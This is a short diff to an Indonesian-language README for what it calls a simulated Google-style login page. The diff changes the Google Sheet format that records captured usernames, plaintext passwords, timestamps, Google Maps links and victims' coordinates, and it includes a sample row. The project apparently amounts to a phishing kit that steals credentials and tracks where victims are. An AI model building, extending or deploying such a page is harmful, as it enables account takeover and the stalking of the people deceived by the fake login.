@@ -50,8 +50,11 @@ Proyek ini adalah simulasi halaman login bergaya Google yang interaktif. Aplikas
 
 Format data yang akan ditulis ke Google Sheet:
 
-| Timestamp | Username | Password | Latitude | Longitude | Accuracy | Source |
-| --------- | -------- | -------- | -------- | --------- | -------- | ------ |
+```
+| Username | Password | Timestamp          | Google Maps Link               | Koordinat       |
+|----------|----------|--------------------|--------------------------------|-----------------|
+| user@abc | 123456   | 2023-01-01 10:00:00| https://maps.google.com?q=-6.1 | -6.1,106.8      |
+```
 
 Contoh data:
 
